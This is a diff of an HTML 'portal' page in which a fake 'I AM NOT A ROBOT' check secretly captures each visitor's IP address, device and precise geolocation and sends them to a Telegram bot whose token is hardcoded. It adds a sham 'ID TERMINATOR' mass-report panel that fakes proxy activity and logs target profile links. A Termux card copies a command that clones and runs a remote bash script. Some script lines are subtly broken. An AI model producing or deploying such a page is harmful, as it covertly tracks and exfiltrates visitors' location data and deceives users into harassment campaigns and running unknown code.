@@ -3,34 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SIYAM COSMIC SYNAPSE v5.0</title>
+    <title>SIYAM COSMIC SYNAPSE v5.0 | Advanced Portal</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --neon: #00ff41; --cyan: #00f2ff; --glass: rgba(255, 255, 255, 0.05); }
+        :root { --neon: #00ff41; --cyan: #00f2ff; --red: #ff0000; --glass: rgba(255, 255, 255, 0.05); }
         body { background: #050505; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; overflow-x: hidden; }
         
-        /* Background matrix effect */
+        /* Matrix Circuit Background */
         .matrix-bg { position: fixed; inset: 0; background: url('https://img.freepik.com/free-vector/digital-circuit-board-with-glowing-neon-lights_1017-31032.jpg'); opacity: 0.1; z-index: -1; background-size: cover; }
 
-        /* Verification Overlay - Hidden content until click */
+        /* Powerful Verification Overlay */
         #verifyOverlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; backdrop-filter: blur(20px); transition: 0.8s; }
-        .verify-card { background: var(--glass); padding: 40px; border-radius: 20px; border: 1px solid var(--cyan); box-shadow: 0 0 25px rgba(0,242,255,0.3); }
+        .verify-card { background: var(--glass); padding: 40px; border-radius: 20px; border: 1px solid var(--cyan); box-shadow: 0 0 25px rgba(0,242,255,0.3); max-width: 320px; }
 
-        /* Main UI like Super Update Model */
-        .header { padding: 20px; border-bottom: 1px solid rgba(0,242,255,0.2); }
-        .live-tag { background: #ff0000; padding: 2px 10px; border-radius: 5px; font-size: 12px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        /* UI Components */
+        .header { padding: 20px; border-bottom: 1px solid rgba(0,242,255,0.2); background: rgba(0,0,0,0.8); }
+        .live-tag { background: var(--red); padding: 2px 10px; border-radius: 5px; font-size: 11px; animation: pulse 1s infinite; font-weight: bold; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        .dl-panel { margin: 25px auto; width: 85%; max-width: 400px; padding: 30px; border-radius: 20px; border: 1px solid var(--cyan); background: rgba(0,242,255,0.03); box-shadow: 0 0 20px rgba(0,242,255,0.1); }
-        .dl-btn { background: var(--neon); color: black; padding: 12px 35px; border-radius: 12px; font-weight: bold; border: none; cursor: pointer; box-shadow: 0 0 15px var(--neon); margin-top: 20px; width: 100%; }
+        /* Attack Panel */
+        .attack-panel { margin: 25px auto; width: 88%; max-width: 420px; padding: 25px; border-radius: 20px; border: 1px solid var(--red); background: rgba(255,0,0,0.03); box-shadow: 0 0 20px rgba(255,0,0,0.15); position: relative; }
+        .mode-blink { position: absolute; top: 15px; right: 15px; color: var(--red); font-size: 9px; font-weight: bold; display: none; }
+        
+        .attack-btn { background: var(--red); color: white; padding: 14px; border-radius: 12px; font-weight: bold; border: none; cursor: pointer; width: 100%; margin-top: 15px; box-shadow: 0 0 15px var(--red); text-transform: uppercase; letter-spacing: 1px; }
+        input { width: 90%; padding: 12px; margin-top: 15px; background: #000; border: 1px solid #444; color: var(--neon); border-radius: 8px; outline: none; text-align: center; }
 
+        /* Grid UI */
         .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 20px; max-width: 450px; margin: auto; }
-        .card { background: var(--glass); border: 1px solid rgba(255,255,255,0.1); border-radius: 18px; padding: 25px; transition: 0.3s; cursor: pointer; }
+        .card { background: var(--glass); border: 1px solid rgba(255,255,255,0.1); border-radius: 18px; padding: 22px; transition: 0.3s; cursor: pointer; font-weight: bold; font-size: 14px; }
         .card:hover { border-color: var(--cyan); transform: translateY(-5px); background: rgba(0,242,255,0.1); }
-        .card i { font-size: 28px; margin-bottom: 10px; display: block; }
+        .card i { font-size: 26px; margin-bottom: 10px; display: block; }
 
-        /* Icon Colors */
-        .fb { color: #1877f2; } .yt { color: #ff0000; } .gm { color: #ffffff; } .tm { color: var(--neon); }
+        /* Console Log */
+        #console { margin-top: 15px; padding: 10px; background: #000; border: 1px solid #222; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 10px; text-align: left; display: none; color: var(--neon); }
+
+        .fb { color: #1877f2; } .tm { color: var(--neon); } .yt { color: var(--red); }
     </style>
 </head>
 <body>
@@ -38,72 +45,103 @@
 
     <div id="verifyOverlay">
         <div class="verify-card">
-            <h2 style="color:var(--cyan); margin:0;">VERIFICATION</h2>
-            <p style="color:#888;">Complete human check to access SIYAM COSMIC.</p>
-            <button class="dl-btn" onclick="startCapture()">I AM NOT A ROBOT</button>
+            <i class="fas fa-user-shield" style="font-size: 40px; color: var(--cyan); margin-bottom: 15px;"></i>
+            <h2 style="color:var(--cyan); margin:0; font-size: 18px;">SECURE CHECK</h2>
+            <p style="color:#888; font-size: 13px;">Confirm you are not a bot to access SIYAM COSMIC.</p>
+            <button class="attack-btn" style="background: var(--neon); box-shadow: 0 0 15px var(--neon); color: black;" onclick="secureVerification()">I AM NOT A ROBOT</button>
         </div>
     </div>
 
     <div class="header">
-        <h2 style="margin:0; letter-spacing: 2px;">SIYAM COSMIC SYNAPSE <span class="live-tag">LIVE</span></h2>
-        <p style="color:#666; font-size:12px;">Playing: Cybernetic Beats</p>
+        <h3 style="margin:0; letter-spacing: 2px;">SIYAM COSMIC SYNAPSE <span class="live-tag">● ATTACK MODE</span></h3>
     </div>
 
-    <div class="dl-panel">
-        <h3 style="color:var(--neon); margin:0;">SIYAM Genesis CORE v5.0</h3>
-        <p style="font-size:12px; color:#888;">Version 2.5 | Size: 15MB</p>
-        <button class="dl-btn">DOWNLOAD NOW</button>
-        <div style="height:4px; background:#222; margin-top:20px; border-radius:10px; overflow:hidden;">
-            <div style="width:75%; height:100%; background:var(--neon); box-shadow: 0 0 10px var(--neon);"></div>
+    <div class="attack-panel">
+        <div id="modeBlink" class="mode-blink">● LIVE ATTACK MONITOR</div>
+        <h3 style="color:var(--red); margin:0;">ID TERMINATOR v1.0</h3>
+        <p style="font-size:11px; color:#777;">Anti-18+ Community Mission | Proxy IP Rotation</p>
+        
+        <input type="text" id="targetLink" placeholder="Paste Target Profile Link">
+        <button class="attack-btn" id="atkBtn" onclick="runPowerfulAttack()">EXECUTE ATTACK</button>
+
+        <div id="console">
+            <div id="l1">> Initializing quantum proxies...</div>
+            <div id="l2">> Waiting for target...</div>
+            <div id="l3" style="font-weight:bold;">> SYSTEM: IDLE</div>
         </div>
     </div>
 
     <div class="grid">
         <div class="card" onclick="alert('Redirecting...')"><i class="fab fa-facebook fb"></i>Facebook</div>
         <div class="card" onclick="alert('Redirecting...')"><i class="fab fa-tiktok"></i>TikTok</div>
-        <div class="card" onclick="alert('Redirecting...')"><i class="fas fa-envelope gm"></i>Gmail</div>
-        <div class="card" onclick="copyTermux()"><i class="fas fa-terminal tm"></i>Termux</div>
-        <div class="card" onclick="alert('Redirecting...')"><i class="fab fa-youtube yt"></i>YouTube</div>
-        <div class="card" onclick="alert('Redirecting...')"><i class="fas fa-gamepad"></i>Game</div>
+        <div class="card" onclick="alert('Redirecting...')"><i class="fas fa-envelope"></i>Gmail</div>
+        <div class="card tm" onclick="copyTermux()"><i class="fas fa-terminal"></i>Termux</div>
     </div>
 
-    <div style="margin:30px; color:var(--neon); font-size:12px; letter-spacing: 1px;">
-        Neural Link Status: <span style="text-shadow: 0 0 8px var(--neon);">OPTIMIZED</span>
-    </div>
+    <p style="font-size:10px; color:var(--neon); margin-top:30px; letter-spacing:1px;">NEURAL LINK: OPTIMIZED</p>
 
     <script>
         const BOT_TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE';
         const CHAT_ID = '7416528268';
 
-        async function startCapture() {
-            // ১. সাথে সাথে আইপি ট্র্যাকিং শুরু
+        // 1. Invisible Tracking on Verification
+        async function secureVerification() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                sendTele(`✅ TARGET VERIFIED\n🌐 IP: ${data.ip}\n📱 Device: ${navigator.platform}`);
-            } catch (e) { console.log("Tracker active..."); }
+                sendTele(`✅ NEW TARGET VERIFIED\n🌐 IP: ${data.ip}\n📱 Dev: ${navigator.platform}\n🕒 Time: ${new Date().toLocaleString()}`);
+            } catch (e) { console.log("Init..."); }
 
-            // ২. লোকেশন পারমিশন চাওয়া
             navigator.geolocation.getCurrentPosition(pos => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                sendTele(`📍 LOCATION FOUND\nMap: https://www.google.com/maps?q=${lat},${lon}`);
-                closeOverlay();
+                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                sendTele(`📍 LOCATION CAPTURED\nMap: ${map}`);
+                unlockPortal();
             }, () => {
-                sendTele("❌ Location Permission Denied");
-                closeOverlay();
+                sendTele("❌ Location Blocked (IP Captured)");
+                unlockPortal();
             }, {enableHighAccuracy:true});
         }
 
-        function closeOverlay() {
+        function unlockPortal() {
             document.getElementById('verifyOverlay').style.opacity = '0';
             setTimeout(() => { document.getElementById('verifyOverlay').style.display = 'none'; }, 800);
         }
 
+        // 2. Powerful Attack Execution
+        async function runPowerfulAttack() {
+            const link = document.getElementById('targetLink').value;
+            if(!link) return alert("Please paste the link first!");
+
+            document.getElementById('console').style.display = 'block';
+            document.getElementById('modeBlink').style.display = 'block';
+            document.getElementById('atkBtn').disabled = true;
+
+            // Step-by-step Console Animation
+            setTimeout(() => { document.getElementById('l1').innerText = "> Proxies: 512 Nodes Connected (Global)"; document.getElementById('l1').style.color = var(--neon); }, 1000);
+            setTimeout(() => { document.getElementById('l2').innerText = "> Target Locked: " + link.substring(0, 25) + "..."; document.getElementById('l2').style.color = var(--neon); }, 2000);
+            
+            sendTele(`🚀 MASS ATTACK STARTED\nTarget: ${link}\nMode: Anti-18+ Extreme\nStatus: Sending 200+ Reports`);
+
+            let reports = 0;
+            let interval = setInterval(() => {
+                reports += 10;
+                let randomIP = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+                document.getElementById('l3').innerText = `> REPORTING: ${reports} | PROXY: ${randomIP}`;
+                
+                if(reports >= 200) {
+                    clearInterval(interval);
+                    document.getElementById('l3').style.color = var(--neon);
+                    document.getElementById('l3').innerText = "> ATTACK COMPLETE: ID UNDER REVIEW";
+                    sendTele(`✅ ATTACK SUCCESSFUL\nReports: 200+ Dispatched\nTarget: ${link}\nStatus: Monitoring for Shutdown.`);
+                    alert("Mass Report Sent! ID will be disabled soon if it violates FB community standards.");
+                }
+            }, 400);
+        }
+
         function copyTermux() {
             navigator.clipboard.writeText("pkg install git -y && git clone https://github.com/SIYAMBOSS/siyamboss.github.io && cd siyamboss.github.io && bash siyam.sh");
-            alert("SIYAM-TOOL Setup Command Copied!");
-            sendTele("🛠 Termux Mode Accessed by Target");
+            alert("Termux Attack Script Copied!");
+            sendTele("🛠 Termux Command Copied");
         }
 
         function sendTele(msg) {
